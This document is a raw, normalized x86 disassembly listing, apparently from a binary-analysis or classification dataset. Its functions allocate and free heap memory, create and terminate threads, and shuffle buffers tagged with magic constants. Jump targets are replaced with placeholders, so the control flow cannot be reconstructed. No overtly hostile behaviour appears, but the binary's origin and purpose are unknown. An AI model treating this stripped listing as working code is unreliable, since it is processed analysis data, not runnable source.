mov ecx [ ebp - 0x18 ]
call sub_410811
mov al 0x1
mov eax [ ebp + 0x14 ]
mov eax [ eax ]
mov [ ebp - 0x7 ] eax
jmp r-xdata
cmp [ ebp - 0x1c ] 0x1
jbe r-xdata
xor al al
jmp r-xdata
cmp [ ebp - 0x1c ] 0x4
jbe r-xdata
mov ecx [ ebp - 0x18 ]
add ecx 0x10
call sub_401000
mov [ ebp - 0x14 ] eax
push 0x0
push [ ebp + 0x10 ]
push [ ebp + 0x14 ]
mov ecx [ ebp - 0x18 ]
add ecx 0x10
call sub_410811
mov eax [ ebp - 0x14 ]
mov [ ebp - 0x7 ] eax
jmp r-xdata
cmp [ ebp - 0x1c ] 0x5
je r-xdata
mov eax [ ebp + 0x14 ]
mov [ ebp - 0x7 ] eax
jmp r-xdata
cmp [ ebp - 0x1c ] 0x5
jbe r-xdata
cmp [ ebp - 0x1c ] 0x8
jbe r-xdata
jmp r-xdata
sub_416fc3
push ebp
mov ebp esp
push 0xffffffff
push sub_423a3f
mov eax [ fs : 0x0 ]
push eax
mov [ fs : 0x0 ] esp
push ecx
sub esp 0x24
push ebx
push esi
push edi
mov [ ebp - 0x10 ] esp
mov [ ebp - 0x30 ] ecx
and [ ebp - 0x18 ] 0x0
and [ ebp - 0x1c ] 0x0
mov ecx [ ebp + 0x8 ]
call sub_4106f0
push 0xffffffff
mov ecx [ ebp + 0x8 ]
call sub_410af3
mov ecx [ ebp - 0x30 ]
call sub_401000
xor edx edx
push 0xd
pop ecx
div ecx
mov [ ebp - 0x24 ] eax
and [ ebp - 0x4 ] 0x0
push [ ebp - 0x18 ]
mov ecx [ ebp + 0x8 ]
call sub_410ad8
mov ecx [ ebp + 0x8 ]
call sub_401000
add eax 0x4
push eax
mov ecx [ ebp + 0x8 ]
call sub_410ad8
jmp r-xdata
mov ecx [ ebp - 0x30 ]
call sub_40100f
mov ecx [ ebp - 0x1c ]
imul ecx ecx 0xd
add eax ecx
mov [ ebp - 0x20 ] eax
mov ecx [ ebp + 0x8 ]
call sub_401000
add eax 0x4
push eax
mov ecx [ ebp + 0x8 ]
call sub_410ad8
push 0x0
push 0xd
push [ ebp - 0x20 ]
mov ecx [ ebp + 0x8 ]
call sub_410811
mov eax [ ebp - 0x18 ]
inc eax
mov [ ebp - 0x18 ] eax
mov eax [ ebp - 0x20 ]
mov al [ eax + 0x4 ]
mov [ ebp - 0x34 ] al
cmp [ ebp - 0x34 ] 0x0
jb r-xdata
or [ ebp - 0x4 ] 0xffffffff
mov al 0x1
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop edi
pop esi
pop ebx
leave
retn 0x4
mov eax [ ebp - 0x18 ]
dec eax
mov [ ebp - 0x18 ] eax
cmp [ ebp - 0x34 ] 0x1
jbe r-xdata
mov eax [ ebp - 0x1c ]
cmp eax [ ebp - 0x24 ]
jge r-xdata
jmp r-xdata
cmp [ ebp - 0x34 ] 0x1
jbe r-xdata
mov eax [ ebp - 0x1c ]
inc eax
mov [ ebp - 0x1c ] eax
jmp r-xdata
cmp [ ebp - 0x34 ] 0x4
jbe r-xdata
push 0x0
mov eax [ ebp - 0x20 ]
push [ eax + 0x5 ]
mov ecx [ ebp - 0x30 ]
add ecx 0x10
call sub_40100f
mov ecx [ ebp - 0x20 ]
add eax [ ecx + 0x9 ]
push eax
mov ecx [ ebp + 0x8 ]
call sub_410811
jmp r-xdata
cmp [ ebp - 0x34 ] 0x5
je r-xdata
mov eax [ ebp - 0x20 ]
mov eax [ eax + 0x9 ]
mov [ ebp - 0x14 ] eax
cmp [ ebp - 0x14 ] 0x0
jne r-xdata
cmp [ ebp - 0x34 ] 0x5
jbe r-xdata
mov eax [ ebp - 0x20 ]
push [ eax + 0x5 ]
push [ ebp - 0x14 ]
call [ IsBadReadPtr@IAT ]
test eax eax
je r-xdata
mov eax [ ebp - 0x18 ]
dec eax
mov [ ebp - 0x18 ] eax
jmp r-xdata
cmp [ ebp - 0x34 ] 0x8
jbe r-xdata
push 0x0
mov eax [ ebp - 0x20 ]
push [ eax + 0x5 ]
push [ ebp - 0x14 ]
mov ecx [ ebp + 0x8 ]
call sub_410811
mov eax [ ebp - 0x14 ]
mov [ ebp - 0x2c ] eax
push [ ebp - 0x2c ]
call j_sub_405a68
pop ecx
jmp r-xdata
mov eax [ ebp - 0x18 ]
dec eax
mov [ ebp - 0x18 ] eax
mov eax [ ebp - 0x14 ]
mov [ ebp - 0x28 ] eax
push [ ebp - 0x28 ]
call j_sub_405a68
pop ecx
jmp r-xdata
jmp r-xdata
sub_4171e2
push ebp
mov ebp esp
push ecx
mov [ ebp - 0x4 ] ecx
cmp [ ebp + 0x14 ] 0x0
je r-xdata
xor al al
jmp r-xdata
cmp [ ebp + 0x10 ] 0x0
jne r-xdata
leave
retn 0x10
push [ ebp + 0x14 ]
mov eax [ ebp + 0x10 ]
shl eax 0x1
push eax
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
mov ecx [ ebp - 0x4 ]
call sub_416efe
sub_417232
push ebp
mov ebp esp
push ecx
push ecx
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] ecx
cmp [ ebp - 0x8 ] 0x0
jne r-xdata
cmp [ rw-data ] 0x0
jne r-xdata
jmp r-xdata
push 0x0
call [ SetLastError@IAT ]
push [ ebp - 0x8 ]
push 0x0
push [ rw-data ]
call [ HeapFree@IAT ]
push 0x0
push [ rw-data ]
call [ HeapCompact@IAT ]
and [ ebp - 0x8 ] 0x0
mov ecx rw-data
call sub_401525
movzx eax al
test eax eax
jne r-xdata
leave
retn
jmp r-xdata
sub_41728e
push ebp
mov ebp esp
sub esp 0xc
mov [ ebp - 0xc ] edx
mov [ ebp - 0x8 ] ecx
cmp [ ebp + 0x8 ] 0x0
jl r-xdata
xor eax eax
jmp r-xdata
cmp [ ebp + 0x8 ] 0x6400000
jle r-xdata
leave
retn 0x4
cmp [ ebp - 0xc ] 0x0
jne r-xdata
cmp [ rw-data ] 0x0
jne r-xdata
xor eax eax
jmp r-xdata
push 0x0
call [ SetLastError@IAT ]
push [ ebp + 0x8 ]
push [ ebp - 0xc ]
push 0x18
push [ rw-data ]
call [ HeapReAlloc@IAT ]
mov [ ebp - 0x4 ] eax
cmp [ ebp - 0x4 ] 0x0
jne r-xdata
mov ecx rw-data
call sub_401525
movzx eax al
test eax eax
jne r-xdata
mov eax [ ebp - 0x4 ]
push [ ebp + 0x8 ]
push [ ebp - 0xc ]
push 0x8
push [ rw-data ]
call [ HeapReAlloc@IAT ]
mov [ ebp - 0x4 ] eax
xor eax eax
jmp r-xdata
sub_417318
push ebp
mov ebp esp
sub esp 0xc
mov [ ebp - 0xc ] edx
mov [ ebp - 0x8 ] ecx
cmp [ ebp - 0xc ] 0x0
jl r-xdata
xor eax eax
jmp r-xdata
cmp [ ebp - 0xc ] 0x6400000
jle r-xdata
leave
retn
cmp [ ebp - 0xc ] 0x0
jne r-xdata
mov eax [ ebp - 0xc ]
add eax 0x4
mov [ ebp - 0xc ] eax
cmp [ rw-data ] 0x0
jne r-xdata
mov eax [ ebp - 0xc ]
inc eax
mov [ ebp - 0xc ] eax
push 0x0
call [ SetLastError@IAT ]
push [ ebp - 0xc ]
push 0x8
push [ rw-data ]
call [ HeapAlloc@IAT ]
mov [ ebp - 0x4 ] eax
cmp [ ebp - 0x4 ] 0x0
jne r-xdata
mov ecx rw-data
call sub_401525
movzx eax al
test eax eax
jne r-xdata
mov eax [ ebp - 0x4 ]
push 0x0
call [ ExitProcess@IAT ]
xor eax eax
jmp r-xdata
sub_41739a
push ebp
mov ebp esp
push 0xffffffff
push sub_423873
mov eax [ fs : 0x0 ]
push eax
mov [ fs : 0x0 ] esp
push ecx
push ecx
push ecx
push ebx
push esi
push edi
mov [ ebp - 0x10 ] esp
call sub_413925
mov eax [ ebp + 0x8 ]
mov [ ebp - 0x14 ] eax
mov eax [ ebp - 0x14 ]
mov eax [ eax ]
mov [ ebp - 0x18 ] eax
and [ ebp - 0x4 ] 0x0
mov eax [ ebp - 0x14 ]
add eax 0xc
push eax
mov eax [ ebp - 0x14 ]
push [ eax + 0x8 ]
push [ ebp - 0x18 ]
mov eax [ ebp - 0x14 ]
mov eax [ eax + 0x4 ]
imul eax eax 0x14
mov ecx [ ebp - 0x18 ]
call [ ecx + eax + 0x284 ]
add esp 0xc
mov ecx [ ebp - 0x14 ]
mov [ ecx + 0x10 ] al
jmp r-xdata
or [ ebp - 0x4 ] 0xffffffff
xor eax eax
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop edi
pop esi
pop ebx
leave
retn 0x4
sub_417428
push ebp
mov ebp esp
sub esp 0x20
push esi
mov [ ebp - 0x1c ] edx
mov [ ebp - 0x18 ] ecx
mov eax [ ebp - 0x1c ]
mov [ ebp - 0x14 ] eax
mov eax [ ebp + 0x8 ]
mov eax [ eax ]
mov [ ebp - 0x10 ] eax
mov eax [ ebp - 0x14 ]
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
add eax 0xc
push eax
call sub_415054
pop ecx
movzx eax al
test eax eax
je r-xdata
xor al al
mov eax [ ebp - 0x4 ]
mov ecx [ ebp + 0x8 ]
mov eax [ eax + 0x8 ]
cmp eax [ ecx ]
jae r-xdata
lea eax [ ebp - 0x10 ]
push eax
push [ ebp - 0x1c ]
call sub_415230
pop ecx
pop ecx
mov [ ebp - 0xc ] eax
mov al 0x1
jmp r-xdata
and [ ebp - 0x8 ] 0x0
jmp r-xdata
pop esi
leave
retn 0x4
mov eax [ ebp - 0x18 ]
mov ecx [ ebp - 0x8 ]
cmp ecx [ eax + 0x2b78 ]
jge r-xdata
and [ ebp - 0x8 ] 0x0
jmp r-xdata
mov eax [ ebp - 0x8 ]
imul eax eax 0x118
mov ecx [ ebp - 0xc ]
mov edx [ ebp - 0x18 ]
mov ecx [ ecx + 0x18 ]
cmp ecx [ edx + eax + 0x87c ]
jne r-xdata
mov eax [ ebp - 0x18 ]
mov ecx [ ebp - 0x8 ]
cmp ecx [ eax + 0x4e7c ]
jge r-xdata
jmp r-xdata
mov eax [ ebp - 0xc ]
mov ecx [ rw-data ]
cmp ecx [ eax + 0x20 ]
jne r-xdata
mov eax [ ebp - 0x18 ]
mov [ eax + 0x5778 ] 0x0
mov eax [ ebp - 0xc ]
mov eax [ eax + 0x18 ]
mov [ ebp - 0x20 ] eax
cmp [ ebp - 0x20 ] 0xff00aaee
je r-xdata
mov eax [ ebp - 0x8 ]
imul eax eax 0x118
mov ecx [ ebp - 0xc ]
mov edx [ ebp - 0x18 ]
mov ecx [ ecx + 0x18 ]
cmp ecx [ edx + eax + 0x2b80 ]
jne r-xdata
mov eax [ ebp - 0x8 ]
inc eax
mov [ ebp - 0x8 ] eax
mov eax [ ebp - 0x8 ]
imul eax eax 0x118
mov ecx [ ebp - 0x18 ]
cmp [ ecx + eax + 0x984 ] 0x0
jle r-xdata
jmp r-xdata
mov eax [ ebp - 0x18 ]
mov edx [ eax + 0x5770 ]
mov ecx [ ebp - 0x18 ]
call sub_417232
mov eax [ ebp - 0xc ]
mov edx [ eax + 0x24 ]
mov ecx [ ebp - 0x18 ]
call sub_417318
mov ecx [ ebp - 0x18 ]
mov [ ecx + 0x5770 ] eax
mov eax [ ebp - 0x18 ]
cmp [ eax + 0x5770 ] 0x0
je r-xdata
cmp [ ebp - 0x20 ] 0xff00bb00
je r-xdata
jmp r-xdata
mov eax [ ebp - 0xc ]
mov ecx [ rw-data ]
cmp ecx [ eax + 0x20 ]
jne r-xdata
mov eax [ ebp - 0xc ]
mov edx [ eax + 0x24 ]
mov ecx [ ebp - 0x18 ]
call sub_417318
mov ecx [ ebp - 0x8 ]
imul ecx ecx 0x118
mov edx [ ebp - 0x18 ]
lea ecx [ edx + ecx + 0x878 ]
mov edx [ ebp - 0x8 ]
imul edx edx 0x118
mov esi [ ebp - 0x18 ]
mov edx [ esi + edx + 0x984 ]
shl edx 0x4
mov [ ecx + edx + 0xc ] eax
mov eax [ ebp - 0x8 ]
imul eax eax 0x118
mov ecx [ ebp - 0x18 ]
lea eax [ ecx + eax + 0x878 ]
mov ecx [ ebp - 0x8 ]
imul ecx ecx 0x118
mov edx [ ebp - 0x18 ]
mov ecx [ edx + ecx + 0x984 ]
shl ecx 0x4
cmp [ eax + ecx + 0xc ] 0x0
je r-xdata
mov eax [ ebp - 0x8 ]
imul eax eax 0x118
mov ecx [ ebp - 0x18 ]
cmp [ ecx + eax + 0x984 ] 0x10
jl r-xdata
lea eax [ ebp - 0x10 ]
push eax
push [ ebp - 0xc ]
call sub_415230
pop ecx
pop ecx
mov [ ebp - 0xc ] eax
jmp r-xdata
mov eax [ ebp - 0x18 ]
mov ecx [ ebp - 0xc ]
mov ecx [ ecx + 0x24 ]
mov [ eax + 0x5774 ] ecx
mov eax [ ebp - 0x18 ]
push [ eax + 0x5774 ]
mov eax [ ebp - 0xc ]
add eax 0x36
push eax
mov eax [ ebp - 0x18 ]
push [ eax + 0x5770 ]
call sub_4026b0
add esp 0xc
mov eax [ ebp - 0x18 ]
mov [ eax + 0x5778 ] 0x1
jmp r-xdata
mov eax [ ebp - 0x8 ]
inc eax
mov [ ebp - 0x8 ] eax
mov eax [ ebp - 0x8 ]
imul eax eax 0x118
mov ecx [ ebp - 0x18 ]
cmp [ ecx + eax + 0x2c88 ] 0x0
jle r-xdata
jmp r-xdata
mov eax [ ebp - 0x8 ]
imul eax eax 0x118
mov ecx [ ebp - 0x18 ]
lea eax [ ecx + eax + 0x878 ]
mov ecx [ ebp - 0x8 ]
imul ecx ecx 0x118
mov edx [ ebp - 0x18 ]
mov ecx [ edx + ecx + 0x984 ]
shl ecx 0x4
mov edx [ ebp - 0xc ]
mov edx [ edx + 0x24 ]
mov [ eax + ecx + 0x10 ] edx
mov eax [ ebp - 0x8 ]
imul eax eax 0x118
mov ecx [ ebp - 0x18 ]
lea eax [ ecx + eax + 0x878 ]
mov ecx [ ebp - 0x8 ]
imul ecx ecx 0x118
mov edx [ ebp - 0x18 ]
mov ecx [ edx + ecx + 0x984 ]
shl ecx 0x4
mov edx [ ebp - 0xc ]
mov edx [ edx + 0x20 ]
mov [ eax + ecx + 0x14 ] edx
mov eax [ ebp - 0xc ]
mov eax [ eax + 0x20 ]
mov [ rw-data ] eax
mov eax [ ebp - 0xc ]
push [ eax + 0x24 ]
mov eax [ ebp - 0xc ]
add eax 0x36
push eax
mov eax [ ebp - 0x8 ]
imul eax eax 0x118
mov ecx [ ebp - 0x18 ]
lea eax [ ecx + eax + 0x878 ]
mov ecx [ ebp - 0x8 ]
imul ecx ecx 0x118
mov edx [ ebp - 0x18 ]
mov ecx [ edx + ecx + 0x984 ]
shl ecx 0x4
push [ eax + ecx + 0xc ]
call sub_4026b0
add esp 0xc
mov eax [ ebp - 0x8 ]
imul eax eax 0x118
mov ecx [ ebp - 0x18 ]
mov eax [ ecx + eax + 0x984 ]
inc eax
mov ecx [ ebp - 0x8 ]
imul ecx ecx 0x118
mov edx [ ebp - 0x18 ]
mov [ edx + ecx + 0x984 ] eax
mov eax [ ebp - 0x8 ]
imul eax eax 0x118
mov ecx [ ebp - 0x18 ]
and [ ecx + eax + 0x984 ] 0x0
cmp [ ebp - 0xc ] 0x0
je r-xdata
mov eax [ ebp - 0xc ]
mov edx [ eax + 0x24 ]
mov ecx [ ebp - 0x18 ]
call sub_417318
mov ecx [ ebp - 0x8 ]
imul ecx ecx 0x118
mov edx [ ebp - 0x18 ]
lea ecx [ edx + ecx + 0x2b7c ]
mov edx [ ebp - 0x8 ]
imul edx edx 0x118
mov esi [ ebp - 0x18 ]
mov edx [ esi + edx + 0x2c88 ]
shl edx 0x4
mov [ ecx + edx + 0xc ] eax
mov eax [ ebp - 0x8 ]
imul eax eax 0x118
mov ecx [ ebp - 0x18 ]
lea eax [ ecx + eax + 0x2b7c ]
mov ecx [ ebp - 0x8 ]
imul ecx ecx 0x118
mov edx [ ebp - 0x18 ]
mov ecx [ edx + ecx + 0x2c88 ]
shl ecx 0x4
cmp [ eax + ecx + 0xc ] 0x0
je r-xdata
mov eax [ ebp - 0x8 ]
imul eax eax 0x118
mov ecx [ ebp - 0x18 ]
cmp [ ecx + eax + 0x2c88 ] 0x10
jl r-xdata
mov eax [ ebp - 0x8 ]
imul eax eax 0x118
mov ecx [ ebp - 0x18 ]
lea eax [ ecx + eax + 0x2b7c ]
mov ecx [ ebp - 0x8 ]
imul ecx ecx 0x118
mov edx [ ebp - 0x18 ]
mov ecx [ edx + ecx + 0x2c88 ]
shl ecx 0x4
mov edx [ ebp - 0xc ]
mov edx [ edx + 0x24 ]
mov [ eax + ecx + 0x10 ] edx
mov eax [ ebp - 0x8 ]
imul eax eax 0x118
mov ecx [ ebp - 0x18 ]
lea eax [ ecx + eax + 0x2b7c ]
mov ecx [ ebp - 0x8 ]
imul ecx ecx 0x118
mov edx [ ebp - 0x18 ]
mov ecx [ edx + ecx + 0x2c88 ]
shl ecx 0x4
mov edx [ ebp - 0xc ]
mov edx [ edx + 0x20 ]
mov [ eax + ecx + 0x14 ] edx
mov eax [ ebp - 0xc ]
mov eax [ eax + 0x20 ]
mov [ rw-data ] eax
mov eax [ ebp - 0xc ]
push [ eax + 0x24 ]
mov eax [ ebp - 0xc ]
add eax 0x36
push eax
mov eax [ ebp - 0x8 ]
imul eax eax 0x118
mov ecx [ ebp - 0x18 ]
lea eax [ ecx + eax + 0x2b7c ]
mov ecx [ ebp - 0x8 ]
imul ecx ecx 0x118
mov edx [ ebp - 0x18 ]
mov ecx [ edx + ecx + 0x2c88 ]
shl ecx 0x4
push [ eax + ecx + 0xc ]
call sub_4026b0
add esp 0xc
mov eax [ ebp - 0x8 ]
imul eax eax 0x118
mov ecx [ ebp - 0x18 ]
mov eax [ ecx + eax + 0x2c88 ]
inc eax
mov ecx [ ebp - 0x8 ]
imul ecx ecx 0x118
mov edx [ ebp - 0x18 ]
mov [ edx + ecx + 0x2c88 ] eax
mov eax [ ebp - 0x8 ]
imul eax eax 0x118
mov ecx [ ebp - 0x18 ]
and [ ecx + eax + 0x2c88 ] 0x0
sub_417901
push ebp
mov ebp esp
push 0xffffffff
push sub_4238f7
mov eax [ fs : 0x0 ]
push eax
mov [ fs : 0x0 ] esp
sub esp 0x60
mov [ ebp - 0x6c ] edx
mov [ ebp - 0x68 ] ecx
lea ecx [ ebp - 0x20 ]
call sub_401068
and [ ebp - 0x4 ] 0x0
and [ ebp - 0x48 ] 0x0
mov eax [ ebp + 0xc ]
and [ eax ] 0x0
mov eax [ ebp + 0x10 ]
and [ eax ] 0x0
mov eax [ ebp - 0x68 ]
cmp [ eax + 0x504 ] 0x0
jne r-xdata
mov edx [ ebp - 0x68 ]
add edx 0x5718
mov ecx [ ebp - 0x68 ]
call sub_410cc8
movzx eax al
test eax eax
je r-xdata
mov [ ebp - 0x5d ] 0x0
or [ ebp - 0x4 ] 0xffffffff
lea ecx [ ebp - 0x20 ]
call sub_4010a3
mov al [ ebp - 0x5d ]
jmp r-xdata
mov [ ebp - 0x61 ] 0x0
or [ ebp - 0x4 ] 0xffffffff
lea ecx [ ebp - 0x20 ]
call sub_4010a3
mov al [ ebp - 0x61 ]
call sub_4137bf
mov ecx [ ebp - 0x68 ]
sub eax [ ecx + 0x576c ]
mov [ ebp - 0x30 ] eax
cmp [ ebp - 0x30 ] 0x2a30
jae r-xdata
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
leave
retn 0x14
mov [ ebp + 0x14 ] 0x1
mov [ ebp + 0x14 ] 0x0
jmp r-xdata
and [ ebp - 0x28 ] 0x0
jmp r-xdata
call sub_4137bf
mov ecx [ ebp - 0x68 ]
mov [ ecx + 0x576c ] eax
push 0x1
push 0x200000
lea ecx [ ebp - 0x20 ]
call sub_4105e1
lea ecx [ ebp - 0x20 ]
call sub_401000
mov [ ebp - 0x48 ] eax
mov [ ebp - 0xd ] 0x0
mov eax [ ebp - 0x68 ]
mov eax [ eax + 0x508 ]
mov [ ebp - 0x2c ] eax
movzx eax [ ebp + 0x14 ]
test eax eax
je r-xdata
mov eax [ ebp - 0x68 ]
mov ecx [ ebp - 0x28 ]
cmp ecx [ eax + 0x2b78 ]
jge r-xdata
mov eax [ ebp - 0x2c ]
imul eax eax 0x14
mov ecx [ ebp - 0x68 ]
push [ ecx + eax + 0x290 ]
push [ ebp - 0x24 ]
call [ WaitForSingleObject@IAT ]
mov [ ebp - 0x4c ] eax
cmp [ ebp - 0x4c ] 0x102
je r-xdata
jmp r-xdata
and [ ebp - 0x28 ] 0x0
jmp r-xdata
mov eax [ ebp - 0x28 ]
imul eax eax 0x118
mov ecx [ ebp - 0x68 ]
mov edx [ ebp - 0x6c ]
cmp edx [ ecx + eax + 0x87c ]
jne r-xdata
mov eax [ ebp - 0x2c ]
imul eax eax 0x14
mov ecx [ ebp - 0x68 ]
mov eax [ ecx + eax + 0x294 ]
inc eax
mov ecx [ ebp - 0x2c ]
imul ecx ecx 0x14
mov edx [ ebp - 0x68 ]
mov [ edx + ecx + 0x294 ] eax
push 0x0
push [ ebp - 0x24 ]
call [ TerminateThread@IAT ]
cmp [ ebp - 0x4c ] 0xffffffff
jne r-xdata
mov eax [ ebp - 0x38 ]
mov [ ebp - 0x48 ] eax
movzx eax [ ebp - 0x34 ]
test eax eax
je r-xdata
mov eax [ ebp - 0x68 ]
mov ecx [ ebp - 0x28 ]
cmp ecx [ eax + 0x4e7c ]
jge r-xdata
jmp r-xdata
mov eax [ ebp - 0x28 ]
imul eax eax 0x118
mov ecx [ ebp - 0x68 ]
cmp [ ecx + eax + 0x984 ] 0x0
jle r-xdata
mov eax [ ebp - 0x2c ]
inc eax
mov [ ebp - 0x2c ] eax
mov ecx [ ebp - 0x68 ]
mov eax [ ebp - 0x2c ]
xor edx edx
div [ ecx + 0x504 ]
mov [ ebp - 0x2c ] edx
mov eax [ ebp - 0x68 ]
mov ecx [ ebp - 0x2c ]
mov [ eax + 0x508 ] ecx
mov [ ebp - 0xd ] 0x1
cmp [ ebp - 0x48 ] 0x0
jle r-xdata
push [ ebp - 0x24 ]
call [ CloseHandle@IAT ]
cmp [ ebp - 0x6c ] 0xff00aaee
jne r-xdata
mov eax [ ebp - 0x28 ]
imul eax eax 0x118
mov ecx [ ebp - 0x68 ]
mov edx [ ebp - 0x6c ]
cmp edx [ ecx + eax + 0x2b80 ]
jne r-xdata
mov eax [ ebp - 0x28 ]
inc eax
mov [ ebp - 0x28 ] eax
mov eax [ ebp - 0x28 ]
imul eax eax 0x118
mov ecx [ ebp - 0x68 ]
cmp [ ecx + eax + 0x984 ] 0x10
jge r-xdata
movzx eax [ ebp - 0xd ]
test eax eax
jne r-xdata
mov eax [ ebp - 0x68 ]
mov ecx [ ebp - 0x2c ]
cmp ecx [ eax + 0x508 ]
jne r-xdata
jmp r-xdata
call sub_4137bf
mov ecx [ ebp - 0x68 ]
mov [ ecx + 0x576c ] eax
push 0x0
push 0x20
push rw-data
push [ ebp - 0x48 ]
lea ecx [ ebp - 0x20 ]
call sub_40100f
mov edx eax
mov ecx [ ebp - 0x68 ]
call sub_4182f9
lea eax [ ebp - 0x48 ]
push eax
lea ecx [ ebp - 0x20 ]
call sub_40100f
mov edx eax
mov ecx [ ebp - 0x68 ]
call sub_417428
cmp [ ebp - 0x6c ] 0xff00bb00
jne r-xdata
mov eax [ ebp - 0x68 ]
movzx eax [ eax + 0x5778 ]
test eax eax
je r-xdata
jmp r-xdata
mov eax [ ebp - 0x28 ]
imul eax eax 0x118
mov ecx [ ebp - 0x68 ]
cmp [ ecx + eax + 0x2c88 ] 0x0
jle r-xdata
mov eax [ ebp - 0x28 ]
imul eax eax 0x118
mov ecx [ ebp + 0xc ]
mov edx [ ebp - 0x68 ]
mov eax [ edx + eax + 0x884 ]
mov [ ecx ] eax
mov eax [ ebp - 0x28 ]
imul eax eax 0x118
mov ecx [ ebp + 0x10 ]
mov edx [ ebp - 0x68 ]
mov eax [ edx + eax + 0x888 ]
mov [ ecx ] eax
mov eax [ ebp - 0x28 ]
imul eax eax 0x118
mov ecx [ ebp + 0x8 ]
mov edx [ ebp - 0x68 ]
mov eax [ edx + eax + 0x88c ]
mov [ ecx ] eax
movzx eax [ ebp + 0x18 ]
test eax eax
je r-xdata
mov eax [ ebp - 0x68 ]
and [ eax + 0x58b0 ] 0x0
mov eax [ ebp - 0x68 ]
mov eax [ eax + 0x58b0 ]
inc eax
mov ecx [ ebp - 0x68 ]
mov [ ecx + 0x58b0 ] eax
jmp r-xdata
push 0x14
lea eax [ ebp - 0x44 ]
push eax
call sub_40103d
pop ecx
pop ecx
mov eax [ ebp - 0x68 ]
mov [ ebp - 0x44 ] eax
mov eax [ ebp - 0x2c ]
mov [ ebp - 0x40 ] eax
lea ecx [ ebp - 0x20 ]
call sub_40100f
mov [ ebp - 0x3c ] eax
mov eax [ ebp - 0x48 ]
mov [ ebp - 0x38 ] eax
mov [ ebp - 0x34 ] 0x0
lea eax [ ebp - 0x30 ]
push eax
push 0x0
lea eax [ ebp - 0x44 ]
push eax
push sub_41739a
push 0x10000
push 0x0
call [ CreateThread@IAT ]
mov [ ebp - 0x24 ] eax
cmp [ ebp - 0x24 ] 0xffffffff
jne r-xdata
movzx eax [ ebp - 0xd ]
test eax eax
jne r-xdata
mov edx [ ebp - 0x68 ]
add edx 0x5718
mov ecx [ ebp - 0x68 ]
call sub_410c93
mov eax [ ebp - 0x68 ]
movzx eax [ eax + 0x5778 ]
test eax eax
je r-xdata
mov eax [ ebp - 0x68 ]
cmp [ eax + 0x5770 ] 0x0
je r-xdata
mov eax [ ebp - 0x28 ]
inc eax
mov [ ebp - 0x28 ] eax
mov eax [ ebp - 0x28 ]
imul eax eax 0x118
mov ecx [ ebp - 0x68 ]
cmp [ ecx + eax + 0x2c88 ] 0x10
jge r-xdata
mov eax [ ebp - 0x28 ]
imul eax eax 0x118
mov ecx [ ebp - 0x68 ]
mov [ ecx + eax + 0x890 ] 0x1
mov edx [ ebp - 0x68 ]
add edx 0x5718
mov ecx [ ebp - 0x68 ]
call sub_410c93
mov [ ebp - 0x5e ] 0x1
or [ ebp - 0x4 ] 0xffffffff
lea ecx [ ebp - 0x20 ]
call sub_4010a3
mov al [ ebp - 0x5e ]
jmp r-xdata
mov eax [ ebp - 0x28 ]
imul eax eax 0x118
mov ecx [ ebp - 0x68 ]
mov eax [ ecx + eax + 0x984 ]
dec eax
mov ecx [ ebp - 0x28 ]
imul ecx ecx 0x118
mov edx [ ebp - 0x68 ]
mov [ edx + ecx + 0x984 ] eax
mov eax [ ebp - 0x28 ]
imul eax eax 0x118
mov ecx [ ebp - 0x68 ]
mov eax [ ecx + eax + 0x984 ]
shl eax 0x4
push eax
mov eax [ ebp - 0x28 ]
imul eax eax 0x118
mov ecx [ ebp - 0x68 ]
lea eax [ ecx + eax + 0x894 ]
push eax
mov eax [ ebp - 0x28 ]
imul eax eax 0x118
mov ecx [ ebp - 0x68 ]
lea eax [ ecx + eax + 0x884 ]
push eax
call sub_4026b0
add esp 0xc
mov eax [ ebp - 0x28 ]
imul eax eax 0x118
mov ecx [ ebp - 0x68 ]
lea eax [ ecx + eax + 0x878 ]
mov ecx [ ebp - 0x28 ]
imul ecx ecx 0x118
mov edx [ ebp - 0x68 ]
mov ecx [ edx + ecx + 0x984 ]
shl ecx 0x4
and [ eax + ecx + 0xc ] 0x0
mov eax [ ebp - 0x28 ]
imul eax eax 0x118
mov ecx [ ebp - 0x68 ]
lea eax [ ecx + eax + 0x878 ]
mov ecx [ ebp - 0x28 ]
imul ecx ecx 0x118
mov edx [ ebp - 0x68 ]
mov ecx [ edx + ecx + 0x984 ]
shl ecx 0x4
and [ eax + ecx + 0x10 ] 0x0
mov eax [ ebp - 0x28 ]
imul eax eax 0x118
mov ecx [ ebp - 0x68 ]
lea eax [ ecx + eax + 0x878 ]
mov ecx [ ebp - 0x28 ]
imul ecx ecx 0x118
mov edx [ ebp - 0x68 ]
mov ecx [ edx + ecx + 0x984 ]
shl ecx 0x4
and [ eax + ecx + 0x14 ] 0x0
mov eax [ ebp + 0xc ]
mov ecx [ ebp - 0x68 ]
mov ecx [ ecx + 0x5770 ]
mov [ eax ] ecx
mov eax [ ebp + 0x10 ]
mov ecx [ ebp - 0x68 ]
mov ecx [ ecx + 0x5774 ]
mov [ eax ] ecx
mov eax [ ebp - 0x68 ]
and [ eax + 0x5770 ] 0x0
mov eax [ ebp - 0x68 ]
and [ eax + 0x5774 ] 0x0
mov edx [ ebp - 0x68 ]
add edx 0x5718
mov ecx [ ebp - 0x68 ]
call sub_410c93
mov [ ebp - 0x60 ] 0x1
or [ ebp - 0x4 ] 0xffffffff
lea ecx [ ebp - 0x20 ]
call sub_4010a3
mov al [ ebp - 0x60 ]
jmp r-xdata
mov eax [ ebp - 0x28 ]
imul eax eax 0x118
mov ecx [ ebp + 0xc ]
mov edx [ ebp - 0x68 ]
mov eax [ edx + eax + 0x2b88 ]
mov [ ecx ] eax
mov eax [ ebp - 0x28 ]
imul eax eax 0x118
mov ecx [ ebp + 0x10 ]
mov edx [ ebp - 0x68 ]
mov eax [ edx + eax + 0x2b8c ]
mov [ ecx ] eax
mov eax [ ebp - 0x28 ]
imul eax eax 0x118
mov ecx [ ebp + 0x8 ]
mov edx [ ebp - 0x68 ]
mov eax [ edx + eax + 0x2b90 ]
mov [ ecx ] eax
movzx eax [ ebp + 0x18 ]
test eax eax
je r-xdata
push 0x10
mov eax [ ebp - 0x28 ]
imul eax eax 0x118
mov ecx [ ebp - 0x68 ]
lea eax [ ecx + eax + 0x2b88 ]
push eax
lea eax [ ebp - 0x5c ]
push eax
call sub_4026b0
add esp 0xc
